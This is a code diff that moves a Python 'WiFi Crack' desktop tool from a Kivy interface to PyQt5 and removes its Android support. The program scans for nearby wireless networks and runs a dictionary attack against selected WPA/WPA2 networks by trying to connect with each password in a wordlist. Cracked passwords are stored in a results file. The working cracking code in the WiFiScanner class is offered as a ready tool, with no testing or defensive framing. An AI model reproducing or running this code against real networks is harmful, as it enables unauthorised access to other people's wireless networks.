@@ -1,46 +1,16 @@
-import os
-import platform
-import sys
-import time
-import json
+import sys, os, time, json
 from datetime import datetime
 from threading import Thread
 from typing import List
-from functools import partial
-from kivy.app import App
-from kivy.uix.boxlayout import BoxLayout
-from kivy.uix.gridlayout import GridLayout
-from kivy.uix.scrollview import ScrollView
-from kivy.uix.button import Button
-from kivy.uix.label import Label
-from kivy.uix.textinput import TextInput
-from kivy.uix.checkbox import CheckBox
-from kivy.uix.progressbar import ProgressBar
-from kivy.uix.popup import Popup
-from kivy.uix.filechooser import FileChooserIconView
-from kivy.core.window import Window
-from kivy.clock import Clock
-from kivy.properties import StringProperty, BooleanProperty, NumericProperty
-from kivy.utils import get_color_from_hex
-from kivy.animation import Animation
-
-try:
-    import pywifi
-    from pywifi import const
-    PYWIFI_AVAILABLE = True
-except ImportError:
-    PYWIFI_AVAILABLE = False
-
-if platform.system() == "Windows":
-    try:
-        import comtypes
-    except ImportError:
-        pass
+import pywifi
+from pywifi import const
+from PyQt5 import QtCore, QtWidgets, QtGui
 
 DEFAULT_WORDLIST = "passwords.txt"
 RESULTS_DIR = "results"
 TIMEOUT_SECONDS = 15
-os.makedirs(RESULTS_DIR, exist_ok=True)
+if not os.path.exists(RESULTS_DIR):
+    os.makedirs(RESULTS_DIR)
 
 class Colors:
     RED = "#FF5252"
@@ -61,32 +31,13 @@ class WiFiScanner:
         self.attempted_passwords = set()
         self.running = True
         self.scan_results = []
-        self.android_wifi = False
-        if "ANDROID_ARGUMENT" in os.environ:
-            self.initialize_android_wifi()
-        else:
-            self.initialize_standard_wifi(interface_index)
-    def initialize_android_wifi(self):
-        try:
-            from jnius import autoclass, cast
-            PythonActivity = autoclass('org.kivy.android.PythonActivity')
-            Context = autoclass('android.content.Context')
-            self.wifi_manager = cast('android.net.wifi.WifiManager', PythonActivity.mActivity.getSystemService(Context.WIFI_SERVICE))
-            if not self.wifi_manager.isWifiEnabled():
-                self.wifi_manager.setWifiEnabled(True)
-            self.android_wifi = True
-            self.load_previous_attempts()
-            self.log("Android WiFi initialized successfully.")
-        except Exception as e:
-            self.log("Error initializing Android WiFi: " + str(e))
-            self.android_wifi = False
+        self.initialize_standard_wifi(interface_index)
     def initialize_standard_wifi(self, interface_index):
-        if platform.system() == "Linux" and not os.path.exists("/var/run/wpa_supplicant"):
+        if os.name == "posix" and not os.path.exists("/var/run/wpa_supplicant"):
             self.log("wpa_supplicant not found. Ensure it is installed and running.")
             return
-        if not PYWIFI_AVAILABLE:
-            self.log("pywifi not installed. Installing...")
-            self.install_pywifi()
+        if not pywifi:
+            self.log("pywifi not installed.")
             return
         try:
             self.wifi = pywifi.PyWiFi()
@@ -94,35 +45,16 @@ class WiFiScanner:
             if not interfaces:
                 self.log("No wireless interfaces found!")
                 return
-            self.log(f"Available wireless interfaces: {len(interfaces)}")
-            for i, interface in enumerate(interfaces):
-                self.log(f"{i}: {interface.name()}")
+            self.log("Available wireless interfaces: " + str(len(interfaces)))
             try:
                 self.interface = interfaces[interface_index]
-                self.log(f"Using interface: {self.interface.name()}")
+                self.log("Using interface: " + self.interface.name())
             except IndexError:
-                self.log(f"Interface index {interface_index} out of range. Using default interface (0).")
+                self.log("Interface index out of range. Using default interface.")
                 self.interface = interfaces[0]
             self.load_previous_attempts()
         except Exception as e:
             self.log("Error initializing WiFi: " + str(e))
-    def install_pywifi(self):
-        try:
-            import subprocess
-            self.log("Installing required dependencies...")
-            process = subprocess.Popen([sys.executable, "-m", "pip", "install", "pywifi"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            stdout, stderr = process.communicate()
-            if process.returncode != 0:
-                self.log("Failed to install pywifi: " + stderr.decode())
-                return False
-            if platform.system() == "Windows":
-                process = subprocess.Popen([sys.executable, "-m", "pip", "install", "comtypes"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                process.communicate()
-            self.log("Dependencies installed. Please restart the application.")
-            return True
-        except Exception as e:
-            self.log("Error installing dependencies: " + str(e))
-            return False
     def log(self, message):
         if self.status_callback:
             self.status_callback(message)
@@ -131,27 +63,27 @@ class WiFiScanner:
         success_file = os.path.join(RESULTS_DIR, "successful_cracks.json")
         if os.path.exists(success_file):
             try:
-                with open(success_file, 'r') as f:
+                with open(success_file, "r") as f:
                     self.successful_attempts = json.load(f)
-                self.log(f"Loaded {len(self.successful_attempts)} previously cracked networks")
+                self.log("Loaded " + str(len(self.successful_attempts)) + " previously cracked networks")
             except Exception:
                 self.log("Could not read previous successful attempts")
         attempts_file = os.path.join(RESULTS_DIR, "attempted_combinations.txt")
         if os.path.exists(attempts_file):
             try:
-                with open(attempts_file, 'r') as f:
+                with open(attempts_file, "r") as f:
                     for line in f:
-                        if '--' in line:
-                            network, password = line.strip().split('--', 1)
+                        if "--" in line:
+                            network, password = line.strip().split("--", 1)
                             self.attempted_passwords.add(f"{network}--{password}")
-                self.log(f"Loaded {len(self.attempted_passwords)} previously attempted combinations")
+                self.log("Loaded " + str(len(self.attempted_passwords)) + " previously attempted combinations")
             except Exception:
                 self.log("Could not read previous attempt log")
     def save_successful_attempt(self, network, password):
         self.successful_attempts[network] = {"password": password, "timestamp": datetime.now().isoformat()}
         success_file = os.path.join(RESULTS_DIR, "successful_cracks.json")
         try:
-            with open(success_file, 'w') as f:
+            with open(success_file, "w") as f:
                 json.dump(self.successful_attempts, f, indent=2)
         except Exception:
             self.log("Could not save successful attempt")
@@ -160,29 +92,24 @@ class WiFiScanner:
         self.attempted_passwords.add(attempt_key)
         attempts_file = os.path.join(RESULTS_DIR, "attempted_combinations.txt")
         try:
-            with open(attempts_file, 'a') as f:
-                f.write(f"{attempt_key}\n")
+            with open(attempts_file, "a") as f:
+                f.write(attempt_key + "\n")
         except Exception:
             pass
-    def scan_networks(self):
-        if self.android_wifi:
-            return self.scan_android_wifi()
+    def scan_networks(self) -> List:
         if not self.interface:
             self.log("No wireless interface available")
             return []
         self.log("Scanning for Wi-Fi networks...")
         try:
             if self.interface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
-                self.log("Activating interface...")
-                if platform.system() == "Windows":
-                    try:
-                        self.interface.disconnect()
-                        time.sleep(1)
-                    except Exception:
-                        pass
+                try:
+                    self.interface.disconnect()
+                    time.sleep(1)
+                except Exception:
+                    pass
             self.interface.scan()
-            scan_wait_time = 4 if platform.system() == "Windows" else 2
-            self.log(f"Waiting {scan_wait_time} seconds for scan to complete...")
+            scan_wait_time = 4 if os.name == "nt" else 2
             time.sleep(scan_wait_time)
             seen_ssids = set()
             unique_networks = []
@@ -191,13 +118,13 @@ class WiFiScanner:
                 if not all_results:
                     self.log("No networks found in scan.")
                     return []
-                all_results.sort(key=lambda x: getattr(x, 'signal', 0), reverse=True)
+                all_results.sort(key=lambda x: getattr(x, "signal", 0), reverse=True)
                 for network in all_results:
-                    if hasattr(network, 'ssid') and network.ssid and network.ssid.strip():
+                    if hasattr(network, "ssid") and network.ssid and network.ssid.strip():
                         if network.ssid not in seen_ssids:
                             seen_ssids.add(network.ssid)
                             unique_networks.append(network)
-                    elif hasattr(network, 'bssid') and network.bssid:
+                    elif hasattr(network, "bssid") and network.bssid:
                         if network.bssid not in seen_ssids:
                             seen_ssids.add(network.bssid)
                             network.ssid = f"<Hidden Network: {network.bssid}>"
@@ -210,30 +137,7 @@ class WiFiScanner:
         except Exception as e:
             self.log("Error during network scan: " + str(e))
             return []
-    def scan_android_wifi(self):
-        try:
-            self.wifi_manager.startScan()
-            time.sleep(4)
-            results = self.wifi_manager.getScanResults()
-            self.log(f"Android scan results: {results}")
-            networks = []
-            for result in results.toArray():
-                ssid = result.SSID
-                bssid = result.BSSID
-                level = result.level
-                net = type('Network', (), {})()
-                net.ssid = ssid if ssid and ssid.strip() != "" else f"<Hidden Network: {bssid}>"
-                net.signal = level
-                networks.append(net)
-            self.log(f"Found {len(networks)} networks on Android")
-            return networks
-        except Exception as e:
-            self.log("Error scanning Android WiFi: " + str(e))
-            return []
-    def test_password(self, network, password, timeout=TIMEOUT_SECONDS):
-        if self.android_wifi:
-            self.log("Password testing is not supported on Android.")
-            return False
+    def test_password(self, network, password, timeout=TIMEOUT_SECONDS) -> bool:
         attempt_key = f"{network.ssid}--{password}"
         if attempt_key in self.attempted_passwords:
             return False
@@ -243,11 +147,11 @@ class WiFiScanner:
             profile.ssid = network.ssid
             profile.akm = []
             auth_types = [const.AUTH_ALG_OPEN]
-            if hasattr(network, 'akm') and network.akm:
+            if hasattr(network, "akm") and network.akm:
                 akm_types = network.akm
             else:
                 akm_types = [const.AKM_TYPE_WPA2PSK]
-                if platform.system() != "Windows":
+                if os.name != "nt":
                     akm_types.extend([const.AKM_TYPE_WPAPSK, const.AKM_TYPE_WPA2PSK])
             profile.auth = auth_types[0]
             for akm_type in akm_types:
@@ -265,7 +169,6 @@ class WiFiScanner:
                 temp_profile = self.interface.add_network_profile(profile)
             except Exception as e:
                 if "You must specify profile attributes" in str(e):
-                    self.log("Retrying with alternate profile configuration...")
                     profile = pywifi.Profile()
                     profile.ssid = network.ssid
                     profile.auth = const.AUTH_ALG_OPEN
@@ -314,10 +217,7 @@ class WiFiScanner:
             except Exception:
                 pass
             return False
-    def crack_network(self, network, passwords, progress_callback=None):
-        if self.android_wifi:
-            self.log("Cracking is not supported on Android.")
-            return False, None
+    def crack_network(self, network, passwords: List[str], progress_callback=None):
         if network.ssid in self.successful_attempts:
             self.log("Network " + network.ssid + " already cracked: " + self.successful_attempts[network.ssid]['password'])
             return True, self.successful_attempts[network.ssid]['password']
@@ -337,228 +237,127 @@ class WiFiScanner:
                 return False, None
         return False, None
 
-class NetworkItem(BoxLayout):
-    ssid = StringProperty("")
-    status = StringProperty("")
-    signal = StringProperty("")
-    selected = BooleanProperty(False)
-    def __init__(self, network, **kwargs):
-        super(NetworkItem, self).__init__(**kwargs)
-        self.orientation = 'horizontal'
-        self.size_hint_y = None
-        self.height = 50
-        self.padding = 10
-        self.spacing = 10
-        self.opacity = 0
-        self.network = network
-        self.ssid = network.ssid
-        self.signal = f"{getattr(network, 'signal', 0)} dBm" if hasattr(network, 'signal') else "N/A"
-        self.checkbox = CheckBox(active=False, size_hint_x=None, width=30)
-        self.checkbox.bind(active=self.on_checkbox_active)
-        self.add_widget(self.checkbox)
-        ssid_label = Label(text=self.ssid, halign='left', valign='middle', size_hint_x=0.6, font_size='18sp')
-        ssid_label.bind(size=ssid_label.setter('text_size'))
-        self.add_widget(ssid_label)
-        signal_label = Label(text=self.signal, halign='center', valign='middle', size_hint_x=0.2, font_size='16sp')
-        self.add_widget(signal_label)
-        self.status_label = Label(text="", halign='right', valign='middle', size_hint_x=0.2, font_size='16sp')
-        self.add_widget(self.status_label)
-        Animation(opacity=1, duration=0.5).start(self)
-    def on_checkbox_active(self, checkbox, value):
-        self.selected = value
-    def set_status(self, status, success=False, in_progress=False):
-        self.status = status
-        self.status_label.text = status
-        if success:
-            self.status_label.color = get_color_from_hex(Colors.GREEN)
-        elif in_progress:
-            self.status_label.color = get_color_from_hex(Colors.YELLOW)
-        else:
-            self.status_label.color = get_color_from_hex(Colors.GRAY)
-
-class CrackingTask(BoxLayout):
-    ssid = StringProperty("")
-    progress = NumericProperty(0)
-    current_password = StringProperty("")
-    status = StringProperty("Waiting...")
-    def __init__(self, network, **kwargs):
-        super(CrackingTask, self).__init__(**kwargs)
-        self.orientation = 'vertical'
-        self.size_hint_y = None
-        self.height = 120
-        self.padding = 10
-        self.spacing = 5
-        self.network = network
-        self.ssid = network.ssid
-        header = BoxLayout(orientation='horizontal', size_hint_y=None, height=30)
-        ssid_label = Label(text=self.ssid, halign='left', valign='middle', size_hint_x=0.7, font_size='20sp', color=get_color_from_hex(Colors.CYAN))
-        ssid_label.bind(size=ssid_label.setter('text_size'))
-        header.add_widget(ssid_label)
-        self.status_label = Label(text=self.status, halign='right', valign='middle', size_hint_x=0.3, font_size='18sp', color=get_color_from_hex(Colors.YELLOW))
-        self.status_label.bind(size=self.status_label.setter('text_size'))
-        header.add_widget(self.status_label)
-        self.add_widget(header)
-        self.password_label = Label(text="", halign='left', valign='middle', font_size='16sp', color=get_color_from_hex(Colors.GRAY))
-        self.password_label.bind(size=self.password_label.setter('text_size'))
-        self.add_widget(self.password_label)
-        self.progress_bar = ProgressBar(max=100, value=0)
-        self.add_widget(self.progress_bar)
-    def update_progress(self, current, total, password):
-        self.progress = (current / total) * 100 if total > 0 else 0
-        self.progress_bar.value = self.progress
-        self.current_password = password
-        self.password_label.text = f"Testing: {password}"
-    def set_status(self, status, success=False, failure=False):
-        self.status = status
-        self.status_label.text = status
-        if success:
-            self.status_label.color = get_color_from_hex(Colors.GREEN)
-        elif failure:
-            self.status_label.color = get_color_from_hex(Colors.RED)
-        else:
-            self.status_label.color = get_color_from_hex(Colors.YELLOW)
-
-class WiFiCrackApp(App):
-    def __init__(self, **kwargs):
-        super(WiFiCrackApp, self).__init__(**kwargs)
-        self.title = 'WiFi Crack'
-        self.scanner = None
+class WiFiCrackWindow(QtWidgets.QMainWindow):
+    def __init__(self):
+        super(WiFiCrackWindow, self).__init__()
+        self.setWindowTitle("WiFi Crack")
+        self.resize(800, 600)
+        central_widget = QtWidgets.QWidget()
+        self.setCentralWidget(central_widget)
+        self.layout = QtWidgets.QVBoxLayout(central_widget)
+        header_layout = QtWidgets.QHBoxLayout()
+        self.title_label = QtWidgets.QLabel("WiFi Crack")
+        self.title_label.setStyleSheet("color: {}; font-size: 32px;".format(Colors.CYAN))
+        header_layout.addWidget(self.title_label)
+        self.status_label = QtWidgets.QLabel("Ready")
+        self.status_label.setStyleSheet("color: {}; font-size: 20px;".format(Colors.GREEN))
+        header_layout.addWidget(self.status_label)
+        header_layout.addStretch()
+        self.layout.addLayout(header_layout)
+        self.log_output = QtWidgets.QTextEdit()
+        self.log_output.setReadOnly(True)
+        self.log_output.setStyleSheet("font-size: 16px;")
+        self.layout.addWidget(self.log_output, 1)
+        network_layout = QtWidgets.QVBoxLayout()
+        network_header = QtWidgets.QHBoxLayout()
+        self.network_label = QtWidgets.QLabel("Available Networks")
+        self.network_label.setStyleSheet("color: {}; font-size: 20px;".format(Colors.BLUE))
+        network_header.addWidget(self.network_label)
+        self.scan_button = QtWidgets.QPushButton("Scan")
+        self.scan_button.setStyleSheet("font-size: 20px; background-color: {};".format(Colors.BLUE))
+        self.scan_button.clicked.connect(self.on_scan_pressed)
+        network_header.addWidget(self.scan_button)
+        network_header.addStretch()
+        network_layout.addLayout(network_header)
+        self.network_table = QtWidgets.QTableWidget()
+        self.network_table.setColumnCount(4)
+        self.network_table.setHorizontalHeaderLabels(["SSID", "Signal", "Status", "Select"])
+        self.network_table.horizontalHeader().setStretchLastSection(True)
+        network_layout.addWidget(self.network_table)
+        self.layout.addLayout(network_layout, 2)
+        wordlist_layout = QtWidgets.QHBoxLayout()
+        self.wordlist_label = QtWidgets.QLabel("Wordlist:")
+        self.wordlist_label.setStyleSheet("font-size: 20px;")
+        wordlist_layout.addWidget(self.wordlist_label)
+        self.wordlist_lineedit = QtWidgets.QLineEdit(DEFAULT_WORDLIST)
+        self.wordlist_lineedit.setStyleSheet("font-size: 18px;")
+        wordlist_layout.addWidget(self.wordlist_lineedit)
+        self.upload_button = QtWidgets.QPushButton("Upload")
+        self.upload_button.setStyleSheet("font-size: 18px; background-color: {};".format(Colors.CYAN))
+        self.upload_button.clicked.connect(self.open_file_chooser)
+        wordlist_layout.addWidget(self.upload_button)
+        wordlist_layout.addStretch()
+        self.layout.addLayout(wordlist_layout)
+        button_layout = QtWidgets.QHBoxLayout()
+        self.start_button = QtWidgets.QPushButton("Start Cracking")
+        self.start_button.setStyleSheet("font-size: 20px; background-color: {};".format(Colors.GREEN))
+        self.start_button.clicked.connect(self.on_start_cracking)
+        button_layout.addWidget(self.start_button)
+        self.stop_button = QtWidgets.QPushButton("Stop")
+        self.stop_button.setStyleSheet("font-size: 20px; background-color: {};".format(Colors.RED))
+        self.stop_button.clicked.connect(self.on_stop_pressed)
+        button_layout.addWidget(self.stop_button)
+        button_layout.addStretch()
+        self.layout.addLayout(button_layout)
+        self.scanner = WiFiScanner(status_callback=self.log)
         self.networks = []
         self.passwords = []
         self.network_items = []
-        self.cracking_tasks = {}
-        self.cracking_thread = None
         self.is_scanning = False
         self.is_cracking = False
-    def build(self):
-        self.request_android_permissions()
-        self.root = BoxLayout(orientation='vertical', padding=20, spacing=20)
-        header = BoxLayout(orientation='horizontal', size_hint_y=None, height=60)
-        title = Label(text='WiFi Crack', color=get_color_from_hex(Colors.CYAN), font_size='32sp', size_hint_x=0.7)
-        header.add_widget(title)
-        self.status_label = Label(text='Ready', color=get_color_from_hex(Colors.GREEN), font_size='20sp', size_hint_x=0.3)
-        header.add_widget(self.status_label)
-        self.root.add_widget(header)
-        log_box = BoxLayout(orientation='vertical', size_hint_y=0.3)
-        log_box.add_widget(Label(text='Log Output', size_hint_y=None, height=30, halign='left', font_size='18sp', color=get_color_from_hex(Colors.BLUE)))
-        self.log_scroll = ScrollView(bar_width=10)
-        self.log_output = Label(text='', halign='left', valign='top', size_hint_y=None, padding=(10, 10), font_size='16sp')
-        self.log_output.bind(size=self.on_log_size)
-        self.log_scroll.add_widget(self.log_output)
-        log_box.add_widget(self.log_scroll)
-        self.root.add_widget(log_box)
-        networks_box = BoxLayout(orientation='vertical', size_hint_y=0.4)
-        networks_header = BoxLayout(orientation='horizontal', size_hint_y=None, height=30)
-        networks_header.add_widget(Label(text='Available Networks', halign='left', font_size='20sp', color=get_color_from_hex(Colors.BLUE), size_hint_x=0.7))
-        self.scan_button = Button(text='Scan', size_hint_x=0.3, background_color=get_color_from_hex(Colors.BLUE), font_size='20sp')
-        self.scan_button.bind(on_release=self.on_scan_pressed)
-        networks_header.add_widget(self.scan_button)
-        networks_box.add_widget(networks_header)
-        self.networks_scroll = ScrollView(bar_width=10)
-        self.networks_grid = GridLayout(cols=1, spacing=4, size_hint_y=None)
-        self.networks_grid.bind(minimum_height=self.networks_grid.setter('height'))
-        self.networks_scroll.add_widget(self.networks_grid)
-        networks_box.add_widget(self.networks_scroll)
-        self.root.add_widget(networks_box)
-        wordlist_box = BoxLayout(orientation='horizontal', size_hint_y=None, height=50, spacing=10)
-        wordlist_box.add_widget(Label(text='Wordlist:', size_hint_x=0.3, font_size='20sp'))
-        self.wordlist_input = TextInput(text=DEFAULT_WORDLIST, multiline=False, size_hint_x=0.4, font_size='18sp')
-        wordlist_box.add_widget(self.wordlist_input)
-        upload_btn = Button(text='Upload', size_hint_x=0.3, background_color=get_color_from_hex(Colors.CYAN), font_size='18sp')
-        upload_btn.bind(on_release=self.open_file_chooser)
-        wordlist_box.add_widget(upload_btn)
-        self.root.add_widget(wordlist_box)
-        button_box = BoxLayout(orientation='horizontal', size_hint_y=None, height=60, spacing=20)
-        self.crack_button = Button(text='Start Cracking', disabled=(True if "ANDROID_ARGUMENT" in os.environ else False), background_color=get_color_from_hex(Colors.GREEN), font_size='20sp')
-        self.crack_button.bind(on_release=self.on_crack_pressed)
-        button_box.add_widget(self.crack_button)
-        self.stop_button = Button(text='Stop', disabled=True, background_color=get_color_from_hex(Colors.RED), font_size='20sp')
-        self.stop_button.bind(on_release=self.on_stop_pressed)
-        button_box.add_widget(self.stop_button)
-        self.root.add_widget(button_box)
-        self.scanner = WiFiScanner(status_callback=self.log)
-        self.log("WiFi Crack started. Click 'Scan' to search for networks.")
-        return self.root
-    def request_android_permissions(self):
-        if "ANDROID_ARGUMENT" in os.environ:
-            try:
-                from android.permissions import request_permissions, Permission
-                permissions = [
-                    Permission.ACCESS_WIFI_STATE,
-                    Permission.CHANGE_WIFI_STATE,
-                    Permission.ACCESS_FINE_LOCATION,
-                    Permission.ACCESS_NETWORK_STATE,
-                    Permission.INTERNET,
-                    Permission.WRITE_EXTERNAL_STORAGE,
-                    Permission.READ_EXTERNAL_STORAGE
-                ]
-                request_permissions(permissions)
-                self.log("Android permissions requested")
-            except Exception as e:
-                self.log("Error requesting permissions: " + str(e))
-                self.show_error_popup("Permission Error", "Could not request necessary permissions. Some features may not work.")
-    def open_file_chooser(self, instance):
-        content = FileChooserIconView()
-        popup = Popup(title="Select Wordlist File", content=content, size_hint=(0.9, 0.9))
-        content.bind(on_submit=lambda chooser, selection, touch: self.file_chosen(selection, popup))
-        popup.open()
-    def file_chosen(self, selection, popup):
-        if selection:
-            self.wordlist_input.text = selection[0]
-            self.log("Selected wordlist: " + selection[0])
-        popup.dismiss()
-    def on_log_size(self, instance, value):
-        instance.text_size = (value[0], None)
-        instance.height = max(instance.texture_size[1], 200)
     def log(self, message):
-        def update_log(dt):
-            self.log_output.text += "\n[" + datetime.now().strftime('%H:%M:%S') + "] " + message
-            self.log_scroll.scroll_y = 0
-        Clock.schedule_once(update_log, 0)
-    def on_scan_pressed(self, instance):
+        timestamp = datetime.now().strftime("%H:%M:%S")
+        self.log_output.append("[" + timestamp + "] " + message)
+    def open_file_chooser(self):
+        filename, _ = QtWidgets.QFileDialog.getOpenFileName(self, "Select Wordlist File", "", "Text Files (*.txt);;All Files (*)")
+        if filename:
+            self.wordlist_lineedit.setText(filename)
+            self.log("Selected wordlist: " + filename)
+    def on_scan_pressed(self):
         if self.is_scanning:
             return
-        if not PYWIFI_AVAILABLE and not ("ANDROID_ARGUMENT" in os.environ):
-            self.show_error_popup("PyWiFi not available", "Required dependencies not installed. Restart after installation.")
-            return
-        if not self.scanner or (not self.scanner.interface and not self.scanner.android_wifi):
+        if not self.scanner or not self.scanner.interface:
             self.show_error_popup("No WiFi Interface", "No wireless interface found. Ensure WiFi is enabled.")
             return
         self.is_scanning = True
-        self.scan_button.disabled = True
-        self.status_label.text = "Scanning..."
+        self.scan_button.setEnabled(False)
+        self.status_label.setText("Scanning...")
         self.log("Starting network scan...")
-        self.networks_grid.clear_widgets()
-        self.network_items = []
+        self.network_table.setRowCount(0)
+        self.networks = []
         Thread(target=self.perform_scan).start()
     def perform_scan(self):
         networks = self.scanner.scan_networks()
-        Clock.schedule_once(lambda dt: self.update_network_list(networks), 0)
+        QtCore.QTimer.singleShot(0, lambda: self.update_network_list(networks))
     def update_network_list(self, networks):
         self.networks = networks
-        self.networks_grid.clear_widgets()
+        self.network_table.setRowCount(0)
         self.network_items = []
         if not networks:
             self.log("No networks found.")
-            self.status_label.text = "No networks found"
+            self.status_label.setText("No networks found")
         else:
             self.log("Found " + str(len(networks)) + " networks.")
-            self.status_label.text = "Found " + str(len(networks)) + " networks"
+            self.status_label.setText("Found " + str(len(networks)) + " networks")
             for network in networks:
-                network_item = NetworkItem(network)
-                if network.ssid in self.scanner.successful_attempts:
-                    password = self.scanner.successful_attempts[network.ssid]['password']
-                    network_item.set_status("Cracked: " + password, True)
-                self.networks_grid.add_widget(network_item)
-                self.network_items.append(network_item)
-            if "ANDROID_ARGUMENT" not in os.environ:
-                self.crack_button.disabled = False
+                row = self.network_table.rowCount()
+                self.network_table.insertRow(row)
+                ssid_item = QtWidgets.QTableWidgetItem(network.ssid)
+                self.network_table.setItem(row, 0, ssid_item)
+                signal_item = QtWidgets.QTableWidgetItem(str(getattr(network, "signal", "N/A")))
+                self.network_table.setItem(row, 1, signal_item)
+                status_item = QtWidgets.QTableWidgetItem("")
+                self.network_table.setItem(row, 2, status_item)
+                checkbox = QtWidgets.QCheckBox()
+                self.network_table.setCellWidget(row, 3, checkbox)
+                self.network_items.append((network, checkbox, status_item))
+            self.start_button.setEnabled(True)
         self.is_scanning = False
-        self.scan_button.disabled = False
+        self.scan_button.setEnabled(True)
     def load_passwords(self):
-        wordlist_path = self.wordlist_input.text
+        wordlist_path = self.wordlist_lineedit.text()
         try:
-            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
+            with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
                 passwords = [line.strip() for line in f if line.strip()]
             self.log("Loaded " + str(len(passwords)) + " passwords from " + wordlist_path)
             return passwords
@@ -568,8 +367,8 @@ class WiFiCrackApp(App):
         except IOError:
             self.show_error_popup("File Error", "Error reading wordlist file '" + wordlist_path + "'")
             return []
-    def on_crack_pressed(self, instance):
-        selected_networks = [item for item in self.network_items if item.selected]
+    def on_start_cracking(self):
+        selected_networks = [item for item in self.network_items if item[1].isChecked()]
         if not selected_networks:
             self.show_error_popup("No Network Selected", "Select at least one network to crack.")
             return
@@ -577,39 +376,33 @@ class WiFiCrackApp(App):
         if not self.passwords:
             return
         self.is_cracking = True
-        self.crack_button.disabled = True
-        self.stop_button.disabled = False
-        for item in selected_networks:
-            Thread(target=self.crack_network_thread, args=(item.network,)).start()
-    def crack_network_thread(self, network):
-        progress_callback = lambda current, total, pwd: Clock.schedule_once(lambda dt: self.update_cracking_progress(network, current, total, pwd), 0)
+        self.start_button.setEnabled(False)
+        self.stop_button.setEnabled(True)
+        for network, checkbox, status_item in selected_networks:
+            Thread(target=self.crack_network_thread, args=(network, status_item)).start()
+    def crack_network_thread(self, network, status_item):
+        def progress_callback(current, total, pwd):
+            QtCore.QTimer.singleShot(0, lambda: status_item.setText("Testing: " + pwd + " (" + str(current) + "/" + str(total) + ")"))
         result, found_password = self.scanner.crack_network(network, self.passwords, progress_callback)
         if result:
-            Clock.schedule_once(lambda dt: self.update_network_item_success(network, found_password), 0)
+            QtCore.QTimer.singleShot(0, lambda: status_item.setText("Cracked: " + found_password))
         else:
-            Clock.schedule_once(lambda dt: self.update_network_item_failure(network), 0)
-    def update_cracking_progress(self, network, current, total, password):
-        for item in self.network_items:
-            if item.network.ssid == network.ssid:
-                item.set_status(f"Testing: {password} ({current}/{total})", in_progress=True)
-    def update_network_item_success(self, network, password):
-        for item in self.network_items:
-            if item.network.ssid == network.ssid:
-                item.set_status("Cracked: " + password, success=True)
-    def update_network_item_failure(self, network):
-        for item in self.network_items:
-            if item.network.ssid == network.ssid:
-                item.set_status("Failed", success=False)
-    def on_stop_pressed(self, instance):
+            QtCore.QTimer.singleShot(0, lambda: status_item.setText("Failed"))
+    def on_stop_pressed(self):
         self.is_cracking = False
         if self.scanner:
             self.scanner.running = False
-        self.crack_button.disabled = False
-        self.stop_button.disabled = True
+        self.start_button.setEnabled(True)
+        self.stop_button.setEnabled(False)
         self.log("Cracking stopped by user.")
     def show_error_popup(self, title, message):
-        popup = Popup(title=title, content=Label(text=message, font_size='18sp'), size_hint=(None, None), size=(400, 200))
-        popup.open()
+        popup = QtWidgets.QMessageBox()
+        popup.setWindowTitle(title)
+        popup.setText(message)
+        popup.exec_()
 
-if __name__ == '__main__':
-    WiFiCrackApp().run()
+if __name__ == "__main__":
+    app = QtWidgets.QApplication(sys.argv)
+    window = WiFiCrackWindow()
+    window.show()
+    sys.exit(app.exec_())
